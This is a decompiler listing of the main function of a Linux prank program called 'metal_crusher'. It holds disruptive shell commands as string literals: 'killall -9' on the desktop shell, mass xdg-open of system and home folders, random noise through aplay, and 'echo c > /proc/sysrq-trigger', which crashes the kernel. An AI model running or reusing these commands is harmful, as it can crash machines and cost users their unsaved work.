void _ZN13metal_crusher4main17h9727646a2bcbc8e1E(void)

{
  undefined *puVar1;
  undefined *puVar2;
  uint uVar3;
  char cVar4;
  uint uVar5;
  byte extraout_DL;
  byte extraout_DL_00;
  int iVar6;
  bool bVar7;
  undefined auVar8 [16];
  undefined8 local_268;
  undefined8 uStack_260;
  undefined8 **local_258;
  undefined8 uStack_250;
  char *local_248;
  undefined8 uStack_240;
  char *local_238;
  undefined8 local_230;
  char *local_228;
  undefined8 local_220;
  undefined8 local_218;
  undefined8 local_210;
  undefined local_208 [16];
  undefined **local_1f8;
  undefined8 uStack_1f0;
  undefined8 local_1e8;
  undefined8 local_1c8;
  byte local_1c0;
  undefined8 local_1b8 [2];
  undefined8 local_1a8;
  uint uStack_190;
  undefined uStack_18c;
  undefined2 uStack_18b;
  undefined uStack_189;
  undefined **local_188;
  code *pcStack_180;
  undefined8 **local_178;
  undefined8 local_170;
  byte local_168;
  undefined4 local_160;
  undefined4 uStack_15c;
  undefined4 uStack_158;
  undefined4 uStack_154;
  undefined4 uStack_150;
  undefined4 uStack_14c;
  undefined local_148 [8];
  undefined8 local_140;
  undefined8 local_138;
  undefined4 *local_130;
  undefined *local_128;
  undefined local_120 [40];
  int local_f8 [2];
  undefined local_f0 [40];
  undefined local_c8 [8];
  undefined4 uStack_c0;
  undefined4 uStack_bc;
  undefined8 local_b8;
  undefined local_b0 [8];
  undefined4 uStack_a8;
  undefined4 uStack_a4;
  undefined8 local_a0;
  undefined *local_98 [3];
  undefined4 local_80;
  undefined4 uStack_7c;
  undefined4 uStack_78;
  undefined4 uStack_74;
  undefined8 **local_70;
  undefined4 local_58;
  undefined4 uStack_54;
  undefined4 uStack_50;
  undefined4 uStack_4c;
  undefined local_48 [24];
  
  (*(code *)PTR__ZN3std3env4args17h94b742ddbe085465E_006b42b0)(&local_268);
  _ZN4core4iter6traits8iterator8Iterator7collect17h72b4ec0362567ca5E(local_148,&local_268);
                    /* try { // try from 00497e4d to 00497e54 has its CatchHandler @ 004989b6 */
  _ZN87__LT_T_u20_as_u20_alloc__slice___LT_impl_u20__u5b_T_u5d__GT___to_vec_in__ConvertVec_GT_6to_vec17hc831021ef339ddb2E
            (&local_268);
  local_1e8 = (undefined ***)local_258;
  local_1f8 = local_268;
  uStack_1f0 = uStack_260;
  _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h55000a11ecaa97f2E(local_f8,&local_1f8);
                    /* try { // try from 00497e80 to 00497e8d has its CatchHandler @ 00498962 */
  cVar4 = _ZN53__LT_T_u20_as_u20_core__slice__cmp__SliceContains_GT_14slice_contains17hf85221c3aca31123E
                    (local_f8,local_140,local_138);
  if (cVar4 == '\0') {
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha04b33545db7d743E(local_f8);
    uVar5 = uStack_190;
    local_1a8 = 0x8000000000000000;
    local_1b8[0] = 0;
    uStack_190 = uStack_190 & 0xffffff00;
    uVar3 = uStack_190;
    uStack_190._1_3_ = SUB43(uVar5,1);
    uStack_240 = (ulong)CONCAT16(uStack_189,
                                 CONCAT24(uStack_18b,CONCAT13(uStack_18c,uStack_190._1_3_))) << 8;
    local_258 = (undefined8 **)0x8000000000000000;
    local_268 = (undefined **)0x0;
    uStack_190 = uVar3;
    _ZN3std6thread7Builder15spawn_unchecked17h1ce4ae56c7065926E(&local_1f8,&local_268);
    _ZN4core6result19Result_LT_T_C_E_GT_6expect17h0f618ee5425b50acE(&local_268,&local_1f8);
    _ZN4core3ptr60drop_in_place_LT_std__thread__JoinHandle_LT__LP__RP__GT__GT_17ha4837b2075f310b9E
              (&local_268);
    _ZN13metal_crusher5music10play_audio17h7324776fa7dd087fE();
    _ZN13metal_crusher3fun6notify17hb8b2a52834cecacaE("Fun things will happen soon",0x1b,":D",2);
    (*(code *)PTR__ZN3std6thread5sleep17h8814a255f2a81eccE_006b40e0)(1,0);
    _ZN13metal_crusher3fun6notify17hb8b2a52834cecacaE("Fun things will happen soon",0x1b,":D",2);
    (*(code *)PTR__ZN3std6thread5sleep17h8814a255f2a81eccE_006b40e0)(0,400000000);
    local_208 = _ZN13metal_crusher3fun15detect_terminal17hbf6d36db98f6afb5E();
    (*(code *)PTR__ZN3std6thread5sleep17h8814a255f2a81eccE_006b40e0)(2,300000000);
    puVar1 = PTR__ZN3std6thread5sleep17h8814a255f2a81eccE_006b40e0;
    bVar7 = true;
    while( true ) {
      local_268 = (undefined **)0x1338b4;
      uStack_260 = (code *)0xa;
      local_258 = (undefined8 **)0x1338be;
      uStack_250 = 0xd;
      local_248 = "xdg-open /lib";
      uStack_240 = 0xd;
      local_238 = "xdg-open /home";
      local_230 = 0xe;
      local_228 = "xdg-open /tmp";
      local_220 = 0xd;
      local_218 = 0;
      local_210 = 5;
      while( true ) {
                    /* try { // try from 004980b0 to 004980d1 has its CatchHandler @ 00498a84 */
        auVar8 = _ZN99__LT_core__array__iter__IntoIter_LT_T_C___GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h5fe64c1c96c56c1eE
                           (&local_268);
        if (auVar8._0_8_ == 0) break;
        _ZN13metal_crusher3fun13execute_shell17h41804e4a8d918ef1E(auVar8._0_8_,auVar8._8_8_);
        (*(code *)puVar1)(0,600000000);
      }
                    /* try { // try from 004980e0 to 004980e7 has its CatchHandler @ 00498a16 */
      _ZN4core3ptr73drop_in_place_LT_core__array__iter__IntoIter_LT__RF_str_C_5_usize_GT__GT_17hee509b89839ede61E
                (&local_268);
      local_268 = (undefined **)0x12fd00;
      uStack_260 = (code *)0x10;
      local_258 = (undefined8 **)0x1338f3;
      uStack_250 = 0x13;
      local_248 = "ls /bin; sleep 2000";
      uStack_240 = 0x13;
      local_238 = "ls /usr; sleep 2000";
      local_230 = 0x13;
      local_228 = "ls /etc; sleep 2000";
      local_220 = 0x13;
      local_218 = 0;
      local_210 = 5;
      while( true ) {
                    /* try { // try from 00498170 to 0049819b has its CatchHandler @ 00498a77 */
        auVar8 = _ZN99__LT_core__array__iter__IntoIter_LT_T_C___GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h5fe64c1c96c56c1eE
                           (&local_268);
        if (auVar8._0_8_ == 0) break;
        _ZN13metal_crusher3fun15run_in_terminal17hb55afbf220dc8f24E
                  (local_208._0_8_,local_208._8_8_,auVar8._0_8_,auVar8._8_8_);
        (*(code *)puVar1)(0,600000000);
      }
                    /* try { // try from 004981a0 to 00498200 has its CatchHandler @ 00498a16 */
      _ZN4core3ptr73drop_in_place_LT_core__array__iter__IntoIter_LT__RF_str_C_5_usize_GT__GT_17hee509b89839ede61E
                (&local_268);
      _ZN13metal_crusher3fun17destroy_gui_shell17h1e3240fbf7d5db6fE();
      _ZN13metal_crusher3fun21destroy_file_managers17h119efdf6252da426E();
      local_1f8 = (undefined **)local_208;
      uStack_1f0 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h0847ff0da4c1d6d7E;
      local_268 = &PTR_s_killall__9_00697680;
      uStack_260 = (code *)0x1;
      local_248 = (char *)0x0;
      local_258 = &local_1f8;
      uStack_250 = 1;
      _ZN4core6option15Option_LT_T_GT_11map_or_else17h1648c532ac184ddcE(local_c8,&local_268);
      uStack_260 = (code *)CONCAT44(uStack_bc,uStack_c0);
      local_258 = (undefined8 **)local_b8;
                    /* try { // try from 0049821f to 00498223 has its CatchHandler @ 004989cb */
      _ZN13metal_crusher3fun13execute_shell17h41804e4a8d918ef1E(uStack_260);
                    /* try { // try from 00498224 to 0049823d has its CatchHandler @ 00498a16 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha04b33545db7d743E(&local_268);
      (*(code *)puVar1)(1,200000000);
      _ZN13metal_crusher3fun19reanimate_gui_shell17h0e56d731a5a95ba2E();
      local_268 = (undefined **)0x13393f;
      uStack_260 = (code *)0xd;
      local_258 = (undefined8 **)0x13394c;
      uStack_250 = 0xe;
      local_248 = "xdg-open /run";
      uStack_240 = 0xd;
      local_238 = "xdg-open /sys";
      local_230 = 0xd;
      local_228 = "xdg-open /proc";
      local_220 = 0xe;
      local_218 = 0;
      local_210 = 5;
      while( true ) {
                    /* try { // try from 004982c0 to 004982e1 has its CatchHandler @ 00498a6a */
        auVar8 = _ZN99__LT_core__array__iter__IntoIter_LT_T_C___GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h5fe64c1c96c56c1eE
                           (&local_268);
        if (auVar8._0_8_ == 0) break;
        _ZN13metal_crusher3fun13execute_shell17h41804e4a8d918ef1E(auVar8._0_8_,auVar8._8_8_);
        (*(code *)puVar1)(0,600000000);
      }
                    /* try { // try from 004982f0 to 0049831c has its CatchHandler @ 00498a16 */
      _ZN4core3ptr73drop_in_place_LT_core__array__iter__IntoIter_LT__RF_str_C_5_usize_GT__GT_17hee509b89839ede61E
                (&local_268);
      _ZN13metal_crusher3fun15run_in_terminal17hb55afbf220dc8f24E
                (local_208._0_8_,local_208._8_8_,"tree /home; sleep 2000",0x16);
      (*(code *)puVar1)(0,600000000);
      iVar6 = 4;
      while (iVar6 = iVar6 + -1, iVar6 != 0) {
                    /* try { // try from 0049833e to 00498354 has its CatchHandler @ 00498a65 */
        _ZN13metal_crusher3fun15run_in_terminal17hb55afbf220dc8f24E
                  (local_208._0_8_,local_208._8_8_,"ps aux; sleep 2000",0x12);
        (*(code *)puVar1)(0,600000000);
      }
      local_1f8 = (undefined **)local_208;
      uStack_1f0 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h0847ff0da4c1d6d7E;
      local_268 = &PTR_s_killall__9_00697680;
      uStack_260 = (code *)0x1;
      local_248 = (char *)0x0;
      local_258 = &local_1f8;
      uStack_250 = 1;
                    /* try { // try from 0049839f to 004983ae has its CatchHandler @ 00498a16 */
      _ZN4core6option15Option_LT_T_GT_11map_or_else17h1648c532ac184ddcE(local_b0,&local_268);
      uStack_260 = (code *)CONCAT44(uStack_a4,uStack_a8);
      local_258 = (undefined8 **)local_a0;
                    /* try { // try from 004983cd to 004983d1 has its CatchHandler @ 004989bb */
      _ZN13metal_crusher3fun13execute_shell17h41804e4a8d918ef1E(uStack_260);
                    /* try { // try from 004983d2 to 00498404 has its CatchHandler @ 00498a16 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha04b33545db7d743E(&local_268);
      (*(code *)puVar1)(1,200000000);
      _ZN13metal_crusher3fun21destroy_file_managers17h119efdf6252da426E();
      (*(code *)puVar1)(2,0);
      _ZN13metal_crusher3fun23toggle_desktop_overview17h76fcc1b69c9cf37eE();
      _ZN13metal_crusher3fun26put_random_shit_on_desktop17h71399300085ae3fdE();
      _ZN13metal_crusher3fun23toggle_desktop_overview17h76fcc1b69c9cf37eE();
      local_268 = (undefined **)0x133998;
      uStack_260 = (code *)0x28;
      local_258 = (undefined8 **)0x1339c0;
      uStack_250 = 0x2e;
      local_248 = "xdg-open https://2ip.io";
      uStack_240 = 0x17;
      local_238 = "xdg-open https://github.com/relativemodder/metal-crusher";
      local_230 = 0x38;
      local_228 = "xdg-open https://www.newgrounds.com/audio/listen/1413480";
      local_220 = 0x38;
      local_218 = 0;
      local_210 = 5;
      while( true ) {
                    /* try { // try from 00498480 to 004984b0 has its CatchHandler @ 00498a91 */
        auVar8 = _ZN99__LT_core__array__iter__IntoIter_LT_T_C___GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h5fe64c1c96c56c1eE
                           (&local_268);
        if (auVar8._0_8_ == 0) break;
        _ZN13metal_crusher3fun13execute_shell17h41804e4a8d918ef1E(auVar8._0_8_,auVar8._8_8_);
        _ZN13metal_crusher3fun13execute_shell17h41804e4a8d918ef1E(1,0);
        (*(code *)puVar1)(1,500000000);
      }
                    /* try { // try from 004984c0 to 004984d1 has its CatchHandler @ 00498a16 */
      _ZN4core3ptr73drop_in_place_LT_core__array__iter__IntoIter_LT__RF_str_C_5_usize_GT__GT_17hee509b89839ede61E
                (&local_268);
      (*(code *)puVar1)(0,500000000);
      iVar6 = 8;
      while (iVar6 = iVar6 + -1, iVar6 != 0) {
                    /* try { // try from 004984e4 to 004984f2 has its CatchHandler @ 00498a63 */
        (*(code *)puVar1)(0,200000000);
        _ZN13metal_crusher3fun23toggle_desktop_overview17h76fcc1b69c9cf37eE();
      }
      if (!bVar7) break;
      bVar7 = false;
                    /* try { // try from 00498509 to 00498515 has its CatchHandler @ 00498a16 */
      (*(code *)puVar1)(3,500000000);
    }
                    /* try { // try from 0049851b to 00498541 has its CatchHandler @ 004989b6 */
    _ZN3std3env3var17hfb15700640056880E(&local_268,&DAT_00130114,4);
    _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17hf281b12ef98186e8E(local_98,&local_268);
    uStack_240 = CONCAT44(CONCAT13(uStack_189,CONCAT21(uStack_18b,uStack_18c)),uStack_190);
    local_258 = (undefined8 **)local_1a8;
    local_268 = (undefined **)local_1b8[0];
                    /* try { // try from 00498568 to 00498623 has its CatchHandler @ 00498977 */
    _ZN3std6thread7Builder15spawn_unchecked17ha2ddb01914461b9dE(&local_1f8,&local_268);
    _ZN4core6result19Result_LT_T_C_E_GT_6expect17h0f618ee5425b50acE(&local_268,&local_1f8);
    _ZN4core3ptr60drop_in_place_LT_std__thread__JoinHandle_LT__LP__RP__GT__GT_17ha4837b2075f310b9E
              (&local_268);
    _ZN3std6thread7Builder15spawn_unchecked17heb2ac1b7f718bfa5E(&local_268,local_1b8);
    _ZN4core6result19Result_LT_T_C_E_GT_6expect17h0f618ee5425b50acE(&local_1f8,&local_268);
    _ZN4core3ptr60drop_in_place_LT_std__thread__JoinHandle_LT__LP__RP__GT__GT_17ha4837b2075f310b9E
              (&local_1f8);
    uStack_1f0 = 
    _ZN60__LT_alloc__string__String_u20_as_u20_core__fmt__Display_GT_3fmt17h93175f2dbdefd6b2E;
    local_268 = &PTR_s__home__00697690;
    uStack_260 = (code *)&DAT_00000001;
    local_248 = (char *)0x0;
    uStack_250 = 1;
    local_258 = &local_1f8;
    local_1f8 = local_98;
    _ZN4core6option15Option_LT_T_GT_11map_or_else17h1648c532ac184ddcE(local_48,&local_268);
    _ZN3std2fs8read_dir17h89149955dc944fa3E(&local_268,local_48);
    local_1c8 = _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17hb31effbf8bc15b97E
                          (local_268,(ulong)uStack_260 & 0xffffffff,&PTR_s_src_main_rs_006976e0);
    puVar2 = 
    PTR__ZN75__LT_std__fs__ReadDir_u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h4e712d0990114342E_006b42b8
    ;
    local_1c0 = extraout_DL & 1;
    while( true ) {
      (*(code *)puVar2)(local_f8,&local_1c8);
      if (local_f8[0] != 1) break;
      _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h490d13a838f57c0cE
                (local_120,local_f0,&PTR_s_src_main_rs_006976f8);
                    /* try { // try from 004986aa to 004986e6 has its CatchHandler @ 004989e0 */
      (*(code *)PTR__ZN3std2fs8DirEntry9file_type17hefeddcb43cb060f5E_006b42c0)
                (&local_268,local_120);
      uVar5 = _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h5c47582f0e8716ecE
                        (&local_268,&PTR_s_src_main_rs_00697710);
      if ((uVar5 & 0xf000) == 0x4000) {
        (*(code *)PTR__ZN3std2fs8DirEntry4path17hab67f89e376a9076E_006b42c8)(&local_1f8,local_120);
        local_160 = (undefined4)uStack_1f0;
        uStack_15c = uStack_1f0._4_4_;
        uStack_158 = (undefined4)local_1e8;
        uStack_154 = local_1e8._4_4_;
        local_188 = (undefined **)&local_160;
        pcStack_180 = (code *)
                      PTR__ZN57__LT_std__path__Display_u20_as_u20_core__fmt__Display_GT_3fmt17h20adf00188ba8439E_006b42d0
        ;
        local_268 = &PTR_s_xdg_open_006976a0;
        uStack_260 = (code *)0x1;
        local_248 = (char *)0x0;
        local_258 = &local_188;
        uStack_250 = 1;
                    /* try { // try from 00498746 to 00498750 has its CatchHandler @ 00498994 */
        _ZN4core6option15Option_LT_T_GT_11map_or_else17h1648c532ac184ddcE(&local_80,&local_268);
                    /* try { // try from 00498751 to 00498758 has its CatchHandler @ 0049897f */
        _ZN4core3ptr39drop_in_place_LT_std__path__PathBuf_GT_17h3d4a59f8b713a426E(&local_1f8);
        local_268 = (undefined **)CONCAT44(uStack_7c,local_80);
        uStack_260 = (code *)CONCAT44(uStack_74,uStack_78);
        local_258 = local_70;
                    /* try { // try from 00498777 to 0049877b has its CatchHandler @ 004989a6 */
        _ZN13metal_crusher3fun13execute_shell17h41804e4a8d918ef1E(uStack_260);
                    /* try { // try from 0049877c to 004987b4 has its CatchHandler @ 004989e0 */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha04b33545db7d743E(&local_268);
        (*(code *)PTR__ZN3std2fs8DirEntry4path17hab67f89e376a9076E_006b42c8)(&local_268,local_120);
        _ZN3std2fs8read_dir17hf78a92d2a9764b00E(&local_1f8,&local_268);
        local_170 = _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17hb31effbf8bc15b97E
                              (local_1f8,(ulong)uStack_1f0 & 0xffffffff,&PTR_s_src_main_rs_00697728)
        ;
        local_168 = extraout_DL_00 & 1;
        while( true ) {
          (*(code *)puVar2)(&local_1f8,&local_170);
          if ((int)local_1f8 != 1) break;
          _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h490d13a838f57c0cE
                    (&local_80,&uStack_1f0,&PTR_s_src_main_rs_00697740);
                    /* try { // try from 00498800 to 00498837 has its CatchHandler @ 00498a1d */
          (*(code *)PTR__ZN3std2fs8DirEntry9file_type17hefeddcb43cb060f5E_006b42c0)
                    (&local_268,&local_80);
          uVar5 = _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h5c47582f0e8716ecE
                            (&local_268,&PTR_s_src_main_rs_00697758);
          if ((uVar5 & 0xf000) == 0x4000) {
            (*(code *)PTR__ZN3std2fs8DirEntry4path17hab67f89e376a9076E_006b42c8)
                      (&local_160,&local_80);
            local_58 = uStack_158;
            uStack_54 = uStack_154;
            uStack_50 = uStack_150;
            uStack_4c = uStack_14c;
            local_130 = &local_58;
            local_128 = 
            PTR__ZN57__LT_std__path__Display_u20_as_u20_core__fmt__Display_GT_3fmt17h20adf00188ba8439E_006b42d0
            ;
            local_268 = &PTR_s_xdg_open_006976a0;
            uStack_260 = (code *)0x1;
            local_248 = (char *)0x0;
            local_258 = (undefined8 **)&local_130;
            uStack_250 = 1;
                    /* try { // try from 0049889a to 004988a9 has its CatchHandler @ 00498a04 */
            _ZN4core6option15Option_LT_T_GT_11map_or_else17h1648c532ac184ddcE(&local_188,&local_268)
            ;
                    /* try { // try from 004988aa to 004988b6 has its CatchHandler @ 004989f2 */
            _ZN4core3ptr39drop_in_place_LT_std__path__PathBuf_GT_17h3d4a59f8b713a426E(&local_160);
            local_268 = local_188;
            uStack_260 = pcStack_180;
            local_258 = local_178;
                    /* try { // try from 004988d5 to 004988d9 has its CatchHandler @ 004989e5 */
            _ZN13metal_crusher3fun13execute_shell17h41804e4a8d918ef1E(pcStack_180);
                    /* try { // try from 004988da to 004988f0 has its CatchHandler @ 00498a1d */
            _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha04b33545db7d743E(&local_268)
            ;
            (*(code *)puVar1)(0,400000000);
            _ZN13metal_crusher3fun23toggle_desktop_overview17h76fcc1b69c9cf37eE();
          }
                    /* try { // try from 004987d0 to 004987ff has its CatchHandler @ 00498a18 */
          _ZN4core3ptr38drop_in_place_LT_std__fs__DirEntry_GT_17h783082bf94872fe1E(&local_80);
        }
                    /* try { // try from 00498900 to 00498916 has its CatchHandler @ 004989e0 */
        _ZN4core3ptr37drop_in_place_LT_std__fs__ReadDir_GT_17h571b6ef1f796f6caE(&local_170);
        _ZN13metal_crusher3fun23toggle_desktop_overview17h76fcc1b69c9cf37eE();
        (*(code *)puVar1)(0,400000000);
      }
                    /* try { // try from 00498660 to 004986a9 has its CatchHandler @ 004989db */
      _ZN4core3ptr38drop_in_place_LT_std__fs__DirEntry_GT_17h783082bf94872fe1E(local_120);
    }
                    /* try { // try from 0049891c to 00498935 has its CatchHandler @ 00498977 */
    _ZN4core3ptr37drop_in_place_LT_std__fs__ReadDir_GT_17h571b6ef1f796f6caE(&local_1c8);
    (*(code *)PTR__ZN3std6thread5sleep17h8814a255f2a81eccE_006b40e0)(0x28,0);
                    /* try { // try from 00498936 to 00498942 has its CatchHandler @ 004989b6 */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha04b33545db7d743E(local_98);
  }
  else {
                    /* try { // try from 00497e92 to 0049800f has its CatchHandler @ 004989b6 */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha04b33545db7d743E(local_f8);
    (*(code *)PTR__ZN3std6thread5sleep17h8814a255f2a81eccE_006b40e0)(0x6c,0);
    _ZN13metal_crusher3fun13execute_shell17h41804e4a8d918ef1E("cat /dev/urandom | aplay",0x18);
    (*(code *)PTR__ZN3std6thread5sleep17h8814a255f2a81eccE_006b40e0)(1,0);
    _ZN13metal_crusher3fun13execute_shell17h41804e4a8d918ef1E("echo c > /proc/sysrq-trigger",0x1c);
  }
  _ZN4core3ptr65drop_in_place_LT_alloc__vec__Vec_LT_alloc__string__String_GT__GT_17h42b994d15418b73dE
            (local_148);
  return;
}